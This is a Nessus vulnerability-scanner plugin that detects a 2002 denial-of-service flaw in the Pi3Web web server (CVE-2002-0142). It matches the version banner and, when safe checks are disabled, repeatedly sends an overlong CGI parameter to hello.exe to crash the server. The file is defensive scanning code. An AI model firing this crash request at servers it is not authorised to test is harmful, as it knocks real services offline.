#
# (C) Tenable Network Security, Inc.
#

# We do banner checking, as I could not get my hands on a vulnerable version
#
# Refs: http://online.securityfocus.com/archive/1/250126
#


include("compat.inc");

if(description)
{
 script_id(11099);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2002-0142");
 script_bugtraq_id(3866);
 script_osvdb_id(5777);

 script_name(english:"Pi3Web < 2.0.1 CGI Handler Long Parameter Handling Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The remote server may crash when it is sent a very long CGI parameter 
multiple times, as in :

	GET /cgi-bin/hello.exe?AAAAA[...]AAAA
	
An attacker may use this flaw to prevent the remote host from working 
properly." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.0.1 of Pi3Web." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/08/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/01/14");
 script_cvs_date("$Date: 2014/07/11 19:38:17 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:pi3:pi3web");
 script_end_attributes();

 script_summary(english:"Tests for a DoS in Pi3Web");
 script_category(ACT_MIXED_ATTACK);
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_family(english: "Web Servers");
 script_copyright(english:"This script is Copyright (C) 2002-2014 Tenable Network Security, Inc.");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if ( "Pi3Web/" >!< banner ) exit(0);

if(egrep(pattern:"^Server: Pi3Web/2\.0\.[01]([^0-9]|$)", string:banner))
{
  security_warning(port);
  # No use to try the DoS if the banner matches
  exit(0);
}

if (safe_checks()) exit(0);

if (http_is_dead(port: port)) exit(0);

foreach d (cgi_dirs())
{
 cgi = strcat(d, "/hello.exe");
 req = http_mk_get_req(port: port, item: strcat(cgi, "?", crap(224)));

 for (i = 0; i < 5; i ++)	# is 5 enough?
 {
  r = http_send_recv_req(port: port, req: req);
  if (isnull(r) || r[0] =~ "^HTTP/1\.[01] 404") break;
 }
}

if (http_is_dead(port: port, retry: 3)) security_warning(port);
